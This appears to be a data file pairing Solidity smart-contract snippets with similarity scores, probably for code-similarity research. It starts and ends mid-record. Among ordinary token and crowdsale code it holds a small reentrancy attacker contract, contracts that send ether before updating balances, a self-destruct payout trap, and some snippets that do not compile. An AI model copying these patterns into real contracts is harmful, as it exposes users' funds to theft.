 function Mutex() public payable {
   locked=false;
}

function canBeAttacked() public  returns (uint) {
require(msg.sender.call.value(1 ether)());
return 7;
 }


  function f() public noReentrancy returns (uint) {
require(msg.sender.call());
  return 7;
  }
 }",0.6431525974377801,"contract Token {

    function transfer(address receiver, uint amount) public returns (bool) {

        (receiver);

        (amount);

        return false;

    }



    function balanceOf(address holder) public view returns (uint) {

        (holder);

        return 0;

    }



    function approve(address _spender, uint256 _value) public returns (bool) {

        (_spender);

        (_value);

        return false;

    }

}"
"contract attacker{
      bool again=false;
function attacker() public  {

   }   
      function() public  payable{
             if(!again){
              again=true;
            Mutex(msg.sender).canBeAttacked();
         }
     }
   function payment(Mutex mutex) public {
        mutex.canBeAttacked();
    }
 }",0.6135860213842482,"contract Deposit {

    address public owner;

    
    function Deposit() public {
        owner = msg.sender;
    }

    
    function() public payable {
        _transter(msg.value);
    }

    
    function _transter(uint balance) internal {
        owner.transfer(balance);
    }
}"
"contract Marketplace {

   Token public cashToken;

   constructor(address cashTokenAddress) public {
       cashToken = Token(cashTokenAddress);
   }

   function getTotalSupply() public view returns (uint) {
       return cashToken.totalSupply();
   }
}",0.6379580781233349,"contract TokInterface {

    function totalSupply() public view returns (uint);

    function balanceOf(address) public view returns (uint);

    function allowance(address, address) public view returns (uint);

}"
"contract TestIntToString {
  function getSha256(string str) external pure returns (bytes32) {
    bytes32 hash = sha256(abi.encodePacked(str));

    return hash;
    
    }
}",0.6384180251254977,"contract IStorable {

  function getLedgerNameHash() external view returns (bytes32);

  function getStorageNameHash() external view returns (bytes32);

}"
"contract d15 is d8  {
    function getBalance(address addr)  public returns (uint myNumber) {
    return d8(addr).myBalance();
    }
}",0.662167909704186,"contract Token is ERC20Basic {
  
  
  
  
  function balanceOfAt(address _owner, uint _blockNumber) public constant returns (uint);
}"
"contract Zedd is ERC20 {

    using SafeMath for uint256;
    address owner = msg.sender;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public Claimed; 

    string public constant name = ""Zedd"";
    string public constant symbol = ""ZedM"";
    uint public constant decimals = 12;
    uint public deadline = now + 37 * 1 days;
    uint public round2 = now + 32 * 1 days;
    uint public round1 = now + 22 * 1 days;

    uint256 public totalSupply = 300000000e12;
    uint256 public totalDistributed;
    uint256 public constant requestMinimum = 1 ether / 200; 
    uint256 public tokensPerEth = 50000e12;


    
    address multisig = 0x478E1dD0fb8aE01bE6F23a052CCAdd3037FF0c9F
    ;


    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    event Distr(address indexed to, uint256 amount);
    event DistrFinished();

    event Airdrop(address indexed _owner, uint _amount, uint _balance);

    event TokensPerEthUpdated(uint _tokensPerEth);

    event Burn(address indexed burner, uint256 value);

    event Add(uint256 value);

    bool public distributionFinished = false;

    modifier canDistr() {
        require(!distributionFinished);
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor() public {
        uint256 teamFund = 100000000e12;
        owner = msg.sender;
        distr(owner, teamFund);
    }

    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }

    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }

    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);

        return true;
    }

    function Distribute(address _participant, uint _amount) onlyOwner internal {

        require( _amount > 0 );      
        require( totalDistributed < totalSupply );
        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }

        
        emit Airdrop(_participant, _amount, balances[_participant]);
        emit Transfer(address(0), _participant, _amount);
    }

    function DistributeAirdrop(address _participant, uint _amount) onlyOwner external {        
        Distribute(_participant, _amount);
    }

    function DistributeAirdropMultiple(address[] _addresses, uint _amount) onlyOwner external {        
        for (uint i = 0; i < _addresses.length; i++) Distribute(_addresses[i], _amount);
    }

    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        emit TokensPerEthUpdated(_tokensPerEth);
    }

    function () external payable {
        getTokens();
     }

    function getTokens() payable canDistr  public {
        uint256 tokens = 0;
        uint256 bonus = 0;
        uint256 countbonus = 0;
        uint256 bonusCond1 = 1 ether / 10;
        uint256 bonusCond2 = 1 ether;
        uint256 bonusCond3 = 5 ether;

        tokens = tokensPerEth.mul(msg.value) / 1 ether;        
        address investor = msg.sender;

        if (msg.value >= requestMinimum && now < deadline && now < round1 && now < round2) {
            if(msg.value >= bonusCond1 && msg.value < bonusCond2){
                countbonus = tokens * 10 / 100;
            }else if(msg.value >= bonusCond2 && msg.value < bonusCond3){
                countbonus = tokens * 15 / 100;
            }else if(msg.value >= bonusCond3){
                countbonus = tokens * 20 / 100;
            }
        }else if(msg.value >= requestMinimum && now < deadline && now > round1 && now < round2){
            if(msg.value >= bonusCond2 && msg.value < bonusCond3){
                countbonus = tokens * 20 / 100;
            }else if(msg.value >= bonusCond3){
                countbonus = tokens * 20 / 100;
            }
        }else{
            countbonus = 0;
        }

        bonus = tokens + countbonus;

         if(tokens > 0 && msg.value >= requestMinimum){
            if( now >= deadline && now >= round1 && now < round2){
                distr(investor, tokens);
            }else{
                if(msg.value >= bonusCond1){
                    distr(investor, bonus);
                }else{
                    distr(investor, tokens);
                }   
            }
        }else{
            require( msg.value >= requestMinimum );
        }

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }

        
        multisig.transfer(msg.value);
    }

    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }

    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);

        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }

    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }

    function withdrawAll() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }

    function withdraw(uint256 _wdamount) onlyOwner public {
        uint256 wantAmount = _wdamount;
        owner.transfer(wantAmount);
    }

    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(burner, _value);
    }

    function add(uint256 _value) onlyOwner public {
        uint256 counter = totalSupply.add(_value);
        totalSupply = counter; 
        emit Add(_value);
    }


    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}",0.6767236049637492,"contract IdeaCoin is IdeaBasicCoin {

    uint public earnedEthWei;
    uint public soldIdeaWei;
    uint public soldIdeaWeiPreIco;
    uint public soldIdeaWeiIco;
    uint public soldIdeaWeiPostIco;
    uint public icoStartTimestamp;
    mapping(address => uint) public pieBalances;
    address[] public pieAccounts;
    mapping(address => bool) internal pieAccountsMap;
    uint public nextRoundReserve;
    address[] public projects;
    address public projectAgent;
    address public bank1;
    address public bank2;
    uint public bank1Val;
    uint public bank2Val;
    uint public bankValReserve;

    enum IcoStates {
    Coming,
    PreIco,
    Ico,
    PostIco,
    Done
    }

    IcoStates public icoState;

    function IdeaCoin() {
        name = &#39;IdeaCoin&#39;;
        symbol = &#39;IDEA&#39;;
        decimals = 18;
        totalSupply = 100000000 ether;

        owner = msg.sender;
        tryCreateAccount(msg.sender);
    }

    function() payable {
        uint tokens;
        bool moreThenPreIcoMin = msg.value >= 0 ether;
        uint totalVal = msg.value + bankValReserve;
        uint halfVal = totalVal / 2;

        if (icoState == IcoStates.PreIco && moreThenPreIcoMin && soldIdeaWeiPreIco <= 2500000 ether) {

            tokens = msg.value * 15000;
            balances[msg.sender] += tokens;
            soldIdeaWeiPreIco += tokens;

        } else if (icoState == IcoStates.Ico && soldIdeaWeiIco <= 35000000 ether) {
            uint elapsed = now - icoStartTimestamp;

            if (elapsed <= 1 days) {

                tokens = msg.value * 12500;
                balances[msg.sender] += tokens;

            } else if (elapsed <= 6 days && elapsed > 1 days) {

                tokens = msg.value * 11500;
                balances[msg.sender] += tokens;

            } else if (elapsed <= 11 days && elapsed > 6 days) {

                tokens = msg.value * 11000;
                balances[msg.sender] += tokens;

            } else if (elapsed <= 16 days && elapsed > 11 days) {

                tokens = msg.value * 10500;
                balances[msg.sender] += tokens;

            } else {

                tokens = msg.value * 10000;
                balances[msg.sender] += tokens;

            }

            soldIdeaWeiIco += tokens;

        } else if (icoState == IcoStates.PostIco && soldIdeaWeiPostIco <= 12000000 ether) {

            tokens = msg.value * 5000;
            balances[msg.sender] += tokens;
            soldIdeaWeiPostIco += tokens;

        } else {
            revert();
        }

        earnedEthWei += msg.value;
        soldIdeaWei += tokens;

        bank1Val += halfVal;
        bank2Val += halfVal;
        bankValReserve = totalVal - (halfVal * 2);

        tryCreateAccount(msg.sender);
    }

    function setBank(address _bank1, address _bank2) public onlyOwner {
        require(bank1 == address(0x0));
        require(bank2 == address(0x0));
        require(_bank1 != address(0x0));
        require(_bank2 != address(0x0));

        bank1 = _bank1;
        bank2 = _bank2;

        balances[bank1] = 500000 ether;
        balances[bank2] = 500000 ether;
    }

    function startPreIco() public onlyOwner {
        icoState = IcoStates.PreIco;
    }

    function stopPreIcoAndBurn() public onlyOwner {
        stopAnyIcoAndBurn(
        (2500000 ether - soldIdeaWeiPreIco) * 2
        );
        balances[bank1] += soldIdeaWeiPreIco / 2;
        balances[bank2] += soldIdeaWeiPreIco / 2;
    }

    function startIco() public onlyOwner {
        icoState = IcoStates.Ico;
        icoStartTimestamp = now;
    }

    function stopIcoAndBurn() public onlyOwner {
        stopAnyIcoAndBurn(
        (35000000 ether - soldIdeaWeiIco) * 2
        );
        balances[bank1] += soldIdeaWeiIco / 2;
        balances[bank2] += soldIdeaWeiIco / 2;
    }

    function startPostIco() public onlyOwner {
        icoState = IcoStates.PostIco;
    }

    function stopPostIcoAndBurn() public onlyOwner {
        stopAnyIcoAndBurn(
        (12000000 ether - soldIdeaWeiPostIco) * 2
        );
        balances[bank1] += soldIdeaWeiPostIco / 2;
        balances[bank2] += soldIdeaWeiPostIco / 2;
    }

    function stopAnyIcoAndBurn(uint _burn) internal {
        icoState = IcoStates.Coming;
        totalSupply = totalSupply.sub(_burn);
    }

    function withdrawEther() public {
        require(msg.sender == bank1 || msg.sender == bank2);

        if (msg.sender == bank1) {
            bank1.transfer(bank1Val);
            bank1Val = 0;
        }

        if (msg.sender == bank2) {
            bank2.transfer(bank2Val);
            bank2Val = 0;
        }

        if (bank1Val == 0 && bank2Val == 0 && this.balance != 0) {
            owner.transfer(this.balance);
        }
    }

    function pieBalanceOf(address _owner) constant public returns (uint balance) {
        return pieBalances[_owner];
    }

    function transferToPie(uint _amount) public returns (bool success) {
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        pieBalances[msg.sender] = pieBalances[msg.sender].add(_amount);
        tryCreatePieAccount(msg.sender);

        return true;
    }

    function transferFromPie(uint _amount) public returns (bool success) {
        pieBalances[msg.sender] = pieBalances[msg.sender].sub(_amount);
        balances[msg.sender] = balances[msg.sender].add(_amount);

        return true;
    }

    function receiveDividends(uint _amount) internal {
        uint minBalance = 10000 ether;
        uint pieSize = calcPieSize(minBalance);
        uint amount = nextRoundReserve + _amount;

        accrueDividends(minBalance, pieSize, amount);
    }

    function calcPieSize(uint _minBalance) constant internal returns (uint _pieSize) {
        for (uint i = 0; i < pieAccounts.length; i += 1) {
            var balance = pieBalances[pieAccounts[i]];

            if (balance >= _minBalance) {
                _pieSize = _pieSize.add(balance);
            }
        }
    }

    function accrueDividends(uint _minBalance, uint _pieSize, uint _amount) internal {
        uint accrued;

        for (uint i = 0; i < pieAccounts.length; i += 1) {
            address account = pieAccounts[i];
            uint balance = pieBalances[account];

            if (balance >= _minBalance) {
                uint dividends = (balance * _amount) / _pieSize;

                accrued = accrued.add(dividends);
                pieBalances[account] = balance.add(dividends);
            }
        }

        nextRoundReserve = _amount.sub(accrued);
    }

    function tryCreatePieAccount(address _account) internal {
        if (!pieAccountsMap[_account]) {
            pieAccounts.push(_account);
            pieAccountsMap[_account] = true;
        }
    }

    function setProjectAgent(address _project) public onlyOwner {
        projectAgent = _project;
    }

    function makeProject(string _name, uint _required, uint _requiredDays) public returns (address _address) {
        _address = ProjectAgent(projectAgent).makeProject(msg.sender, _name, _required, _requiredDays);

        projects.push(_address);
    }

    function withdrawFromProject(address _project, uint _stage) public returns (bool _success) {
        uint _value;
        (_success, _value) = ProjectAgent(projectAgent).withdrawFromProject(msg.sender, _project, _stage);

        if (_success) {
            receiveTrancheAndDividends(_value);
        }
    }

    function cashBackFromProject(address _project) public returns (bool _success) {
        uint _value;
        (_success, _value) = ProjectAgent(projectAgent).cashBackFromProject(msg.sender, _project);

        if (_success) {
            balances[msg.sender] = balances[msg.sender].add(_value);
        }
    }

    function receiveTrancheAndDividends(uint _sum) internal {
        uint raw = _sum * 965;
        uint reserve = raw % 1000;
        uint tranche = (raw - reserve) / 1000;

        balances[msg.sender] = balances[msg.sender].add(tranche);
        receiveDividends(_sum - tranche);
    }

    function buyProduct(address _product, uint _amount) public {
        ProjectAgent _agent = ProjectAgent(projectAgent);

        uint _price = IdeaSubCoin(_product).price();

        balances[msg.sender] = balances[msg.sender].sub(_price * _amount);
        _agent.buyProduct(_product, msg.sender, _amount);
    }
}"
"contract Name {
    mapping(address=>string) public text;
    string public test;

    function register(string _text) {
        text[msg.sender] = _text;
    }
}",0.655299969158271,"contract IParityRegistry {
    mapping (bytes4 => string) public entries;
    
    function register(string memory _method)
    public
    returns (bool);
}"
"contract HBTCrowdsale {

        
    address public beneficiary; 
    uint256 public minAmount = 1 ether; 
    uint256 public maxAmount = 500000 ether; 
    uint256 public maxSupply = 10**8; 
    uint256 public minAcceptedAmount = 10**15 wei; 

    
    uint256 public rateFirstWeek = 125;
    uint256 public rateSecondWeek = 115;
    uint256 public rateThirdWeek = 105;
    uint256 public rateLastWeek = 100;

    uint256 public rateFirstWeekEnd = 5 minutes; 
    uint256 public rateSecondWeekEnd = 10 minutes;
    uint256 public rateThirdWeekEnd = 15 minutes;
    uint256 public rateLastWeekEnd = 20 minutes;

    enum Stages {
        InProgress,
        Ended,
        Withdrawn
    }

    Stages public stage = Stages.InProgress;

    
    uint256 public start;
    uint256 public end;
    uint256 public raised;

    
    TokenHappyBirthday public hbtToken;

    
    mapping (address => uint256) balances;


    
    modifier atStage(Stages _stage) {
        if (stage != _stage) {
            revert();
        }
        _;
    }


    
    modifier onlyBeneficiary() {
        if (beneficiary != msg.sender) {
            revert();
        }
        _;
    }


    
    function balanceOf(address _investor) constant returns (uint256 balance) {
        return balances[_investor];
    }


    
    function HBTCrowdsale( address _tokenAddress, address _beneficiary , uint256 _start ) {

        
        hbtToken = TokenHappyBirthday(0x14723a09acff6d2a60dcdf7aa4aff308fddc160c);
        beneficiary =  _beneficiary; 0xca35b7d915458ef540ade6068dfe2f44e8fa733c; 
        start = 0; 
        end = start + rateLastWeekEnd;
    }

    
    function toHBT(uint256 _wei) returns (uint256 amount) {
        uint256 rate = 0;
        if (stage != Stages.Ended && now >= start && now <= end) {


            
            if (now <= start + rateFirstWeekEnd) {
                rate = rateFirstWeek;
            }

            
            else if (now <= start + rateSecondWeekEnd) {
                rate = rateSecondWeek;
            }

            
            else if (now <= start + rateThirdWeekEnd) {
                rate = rateThirdWeek;
            }

            
            else if (now <= start + rateLastWeekEnd) {
                rate = rateLastWeek;
            }
        }

        return _wei * rate * 10**4 / 1 ether; 
    }


    
    function endCrowdsale() atStage(Stages.InProgress) {

        
        if (now < end) {
            revert();
        }

        stage = Stages.Ended;
    }


    
    function withdraw() onlyBeneficiary atStage(Stages.Ended) {

        
        if (raised < minAmount) {
            revert();
        }


        
        uint256 ethBalance = this.balance;
        if (!beneficiary.send(ethBalance)) {
            revert();
        }

        stage = Stages.Withdrawn;
    }


    
    function refund() atStage(Stages.Ended) {

        
        if (raised >= minAmount) {
            revert();
        }

        uint256 receivedAmount = balances[msg.sender];
        balances[msg.sender] = 0;

        if (receivedAmount > 0 && !msg.sender.send(receivedAmount)) {
            balances[msg.sender] = receivedAmount;
        }
    }


    
    function () payable atStage(Stages.InProgress) {

        
        if (now < start) {
            revert();
        }

        
        if (now > end) {
            revert();
        }

        
        if (msg.value < minAcceptedAmount) {
            revert();
        }

        uint256 received = msg.value;
        uint256 valueInHBT = toHBT(msg.value);



        
        hbtToken.transfer(msg.sender, valueInHBT);

        if (now <= start + rateFirstWeek) {

        } else {

            
        balances[msg.sender] += received; 
        }

        raised += received;

        
        if (raised >= maxAmount || hbtToken.totalSupply() >= maxSupply) {
            stage = Stages.Ended;
        }
    }
}",0.6385141051849645,"contract Crowdsale is Ownable{
  using SafeMath for uint256;

  
  DragonToken public token;
  
  
  address public tokenReserve;

  
  uint256 public startTime;
  uint256 public endTime;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;

  
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount, uint256 releaseTime);
  
  
  event EndTimeUpdated();
  
  
  event DragonPriceUpdated();
  
  
  event TokenReleased(address indexed holder, uint256 amount);


  function Crowdsale() public {
  
    owner = 0xF615Ac471E066b5ae4BD211CC5044c7a31E89C4e; 
    startTime = now;
    endTime = 1521187200;
    rate = 5000000000000000; 
    wallet = 0xF615Ac471E066b5ae4BD211CC5044c7a31E89C4e;
    token = DragonToken(0x814F67fA286f7572B041D041b1D99b432c9155Ee);
    tokenReserve = 0xdd870fa1b7c4700f2bd7f44238821c26f7392148;
  }

  
  function () external payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address beneficiary) public payable {
    require(beneficiary != address(0));
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = getTokenAmount(weiAmount);

    
    weiRaised = weiRaised.add(weiAmount);

    uint256 lockedFor = assignTokens(beneficiary, tokens);
    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens, lockedFor);

    forwardFunds();
  }

  
  function hasEnded() public view returns (bool) {
    return now > endTime;
  }

  function getTokenAmount(uint256 weiAmount) internal view returns(uint256) {
    uint256 amount = weiAmount.div(rate);
    return amount.mul(100000000); 
  }

  
  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }

  
  function validPurchase() internal view returns (bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }

  function updateEndTime(uint256 newTime) onlyOwner external {
    require(newTime > startTime);
    endTime = newTime;
    EndTimeUpdated();
  }
  
  function updateDragonPrice(uint256 weiAmount) onlyOwner external {
    require(weiAmount > 0);
    rate = weiAmount;
    DragonPriceUpdated();
  }
  
  mapping(address => uint256) balances;
  mapping(address => uint256) releaseTime;
  function assignTokens(address beneficiary, uint256 amount) private returns(uint256 lockedFor){
      lockedFor = now + 45 days;
      balances[beneficiary] = balances[beneficiary].add(amount);
      releaseTime[beneficiary] = lockedFor;
  }
  
  
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  

  function unlockTime(address _owner) public view returns (uint256 time) {
    return releaseTime[_owner];
  }

  
  function releaseDragonTokens() public {
    require(now >= releaseTime[msg.sender]);
    
    uint256 amount = balances[msg.sender];
    require(amount > 0);
    
    balances[msg.sender] = 0;
    if(!token.transferFrom(tokenReserve,msg.sender,amount)){
        revert();
    }

    TokenReleased(msg.sender,amount);
  }
  
}"
"contract HoneyPot {
  mapping (address => uint) public balances;
  function HoneyPot() payable {
    put();
  }
  function put() payable {
    balances[msg.sender] = msg.value;
  }
  function get() {
    if (!msg.sender.call.value(balances[msg.sender])()) {
      revert();
    }
      balances[msg.sender] = 0;
  }
  function() {
    revert();
  }
}",0.6926294785885855,"contract MegaPlay

{

    address Owner = msg.sender;



    function() public payable {}

    function close() private { selfdestruct(msg.sender); }



    function Play() public payable {

        if (msg.value >= address(this).balance) {

           close();

        }

    }

 

    function end() public {

        if (msg.sender == Owner) {

            close();

        }

    }

}"
"contract Eternal {

    string engravedText;

    function Eternal(string eT) payable {
        engravedText = eT;
    }

    function getEngravedText() constant returns (string) {
        return engravedText;
    }

}",0.6308571340837504,"contract Greeter is Mortal {
    
    string greeting;

    
    function Greeter(string _greeting) public {
        greeting = _greeting;
    }

    
    function greet() constant returns (string) {
        return greeting;
    }
}"
"contract A {
  A other;
  function Get() constant returns(bytes8[]) {
    bytes8[] stuff;
    return stuff;
  }
  function Copy() {
    bytes8[] stuff = other.Get();
  }
}",0.6036021963366079,"contract DappTutorial {
  uint storedData;

  function set(uint x) {
    storedData = x;
  }

  function get() constant returns (uint) {
    return storedData * 2;
  }
}"
"contract SimpleSmartAsset is Mortal {

  uint usagePrice;
  Beneficiary[] beneficiaries;
  uint totalWeight; 

  event AssetCreated(uint _usagePrice,
                     address[] addresses,
                     uint[] weights);

  function SimpleSmartAsset(uint _usagePrice,
                            address[] addresses,
                            uint[] weights) {
    owner = msg.sender;
    usagePrice = _usagePrice;

    uint beneficiaryCount = addresses.length;
    for (uint i = 0; i < beneficiaryCount; i++) {

      uint weight = weights[i];

      addBeneficiary(addresses[i], weight);
      totalWeight += weight;
    }

    AssetCreated(_usagePrice, addresses, weights);
  }

  function getUsagePrice() constant returns (uint) {
    return usagePrice;
  }

  event BeneficiaryPaid(address addr, uint amount);

  function pay() payable onlyOwner {
    require(msg.value >= usagePrice);

    uint beneficiaryCount = beneficiaries.length;
    for (uint i = 0; i < beneficiaryCount; i++) {

      Beneficiary memory beneficiary = beneficiaries[i];

      uint weight = beneficiary.weight;
      address addr = beneficiary.addr;

      uint amount = (weight * usagePrice) / totalWeight;

      uint GAS_LIMIT = 4000000;
      addr.transfer.gas(GAS_LIMIT)(amount);
      BeneficiaryPaid(addr, amount);
    }
  }

  struct Beneficiary {
    address addr;
    uint weight;
  }

  function addBeneficiary(address addr, uint weight) onlyOwner {
    beneficiaries.push(Beneficiary({
        addr: addr,
        weight: weight
    }));
  }

}",0.601246538468427,"contract Airdrop {
    
    using SafeMath for uint256;
    using SafeERC20 for ERC20;
    
    
    ERC20 public token;

    address owner = 0x0;

    
    
    
    
    uint256 public rate;
    
    modifier isOwner {
        assert(owner == msg.sender);
        _;
    }

  
  event TokenDropped(
    address indexed sender,
    address indexed beneficiary,
    uint256 value,
    uint256 amount
  );

  
  constructor(ERC20 _token) public
  {
    require(_token != address(0));

    owner = msg.sender;
    token = _token;
  }

  
  
  

  
  function () external payable {
    sendAirDrops(msg.sender);
  }

    
    function sendAirDrops(address _beneficiary) public payable
    {
        uint256 weiAmount = msg.value;
        _preValidatePurchase(_beneficiary, weiAmount);
        
        
        uint256 tokens = 50 * (10 ** 6);
        
        _processAirdrop(_beneficiary, tokens);
        
        emit TokenDropped(
            msg.sender,
            _beneficiary,
            weiAmount,
            tokens
        );
    }
  
    function collect(uint256 _weiAmount) isOwner public {
        address thisAddress = this;
        owner.transfer(thisAddress.balance);
    }

  
  
  

  
  function _preValidatePurchase( address _beneficiary, uint256 _weiAmount) internal
  {
    require(_beneficiary != address(0));
    require(_weiAmount >= 1 * (10 ** 15));
  }

  
  function _deliverTokens(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    token.safeTransfer(_beneficiary, _tokenAmount);
  }

  
  function _processAirdrop(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    _deliverTokens(_beneficiary, _tokenAmount);
  }

}"
"contract TestContact {
    struct Object {
        uint id;
        uint price;
    }

    mapping (uint => Object) private objects; 
    mapping (uint => address) private mapObjectToOwners; 

    function getPrice(uint id) public view returns(uint price) {
        Object storage object = objects[id];
        return object.price;
    }
}",0.6024553831833479,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract Escrow {
  address public owner;
  uint public fee;

  
  mapping (address =>  mapping (address => uint)) public balances;

  function Escrow() public {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  
  function setFee(uint price) onlyOwner external {
    fee = price;
  }

  function start(address payee) payable external {
    balances[msg.sender][payee] = balances[msg.sender][payee] + msg.value;
  }

  function end(address payer, address payee) onlyOwner external {
    uint value = balances[payer][payee];
    
    
    
    
    
    payee.transfer(value)
  }
}",0.6977678276413881,"contract TestABI{

    address owner;

    constructor() public payable{

        owner = msg.sender;

    }

    modifier onlyOwner(){

        require (msg.sender==owner);

        _;

    }

    function () payable public {

        

    }

    

    function getBalance() public constant returns(uint){

        return address(this).balance;

    }

    

    function sendTransfer(address _user,uint _price) public onlyOwner{

        require(_user!=owner);

        if(address(this).balance>=_price){

            _user.transfer(_price);

        }

    }

    

    function getEth(uint _price) public onlyOwner{

        if(_price>0){

            if(address(this).balance>=_price){

                owner.transfer(_price);

            }

        }else{

           owner.transfer(address(this).balance); 

        }

    }

}"
"contract one {
    struct A {
        address[] count;
    }
    struct B {
        uint8[] count;
    }

    mapping (address => A) a;
    mapping (address => B) b;

    function add(address c, uint8 g) {
        a[msg.sender].count.push(c);
        b[msg.sender].count.push(g);
    }
}",0.6233359048443872,"contract Contract1 {



	mapping (uint8 => mapping (address => bool)) public something;



	function settrue(uint8 x, address a){

		something[x][a] = true;

	}

	function setfalse(uint8 x, address a){

		something[x][a] = false;

	}

}"
"contract Proxy {
  address private _owner;
  address private _dest;

  constructor(address dest) public {
    _owner = msg.sender;
    _dest = dest;
  }

  function getDest() public view returns(address) {
    return _dest;
  }

  function setDest(address dest) public {
    require(msg.sender == _owner);
    _dest = dest;
  }

  
  function invoke(string memory method, bytes memory data) public payable {
    bytes memory payload = abi.encodePacked(bytes4(keccak256(bytes(method)))), data, abi.encode(msg.sender), abi.encode(msg.value));
    (bool ok, bytes memory response) = _dest.call(payload);
  }
}",0.6191357220738216,"contract Storage {

    address owner;

    bytes[6] public data;

    uint counter;

    constructor() public {

        owner = msg.sender;

    }

    function uploadData(bytes _data) public returns (uint){

        require(msg.sender == owner);

        data[counter] = _data;

        counter++;

    }

    function getData() public view returns (bytes){

        uint length;

        for(uint i = 0; i<6; i++) {

            length += data[i].length;

        }

        uint index;

        bytes memory result = new bytes(length);

        for(i = 0; i<6; i++) {

            for(uint k = 0; k < data[i].length; k++) {

                result[index + k] = data[i][k];

            }

            index += data[i].length;

        }

        return result;

    }

}"
"contract ETHTEST2 {
    mapping(address => uint256) public deposits; 

    uint256 public z;
    uint256 public t;

    function sendETHtoContract(uint256 j) public payable {  

        if (j == 1){

            z = j;
            msg.value == t;
            t = 24000000000000000000 wei;
            address(this).transfer(msg.value);
            return;
        }

        if (j == 2){

            z = j;
            t = 12000000000000000000 wei;
            address(this).transfer(msg.value);
            return;
        }

        if (j == 3){

            z = j;
            t = 6000000000000000000 wei;
            address(this).transfer(msg.value);
            return;
        }

        if (j >=4 || j < 0){  
            revert();
            return;
        }

    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function() public payable {
    
    }

}",0.6226054301280969,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  uint256 totalSupply_ = 45467000000000000000000000;

  
  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }

  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

}"
"contract Test is ERC721Full {   
   

  function createToken(...) public {
    _mint(msg.sender, id);
  }
}",0.6718151391172871,"contract Token is ERC20 {
  constructor(uint256 supply) public {
    _mint(msg.sender, supply);
  }
}"
"contract SimpleStorage {

  uint public storedData;
  string public name = ""ahmed"";
  event Print(uint);

  function SimpleStorage(uint initialValue) {
    storedData = initialValue;
  }

  function set(uint x) returns (uint){
    storedData = x;
    Print(storedData);
    return storedData;
  }

  function get() constant returns (uint retVal) {
    return storedData;
  }
}",0.6345893830365932,"contract PricingStrategy {

  
  function isPricingStrategy() public constant returns (bool) {
    return true;
  }

  
  function isSane(address crowdsale) public constant returns (bool) {
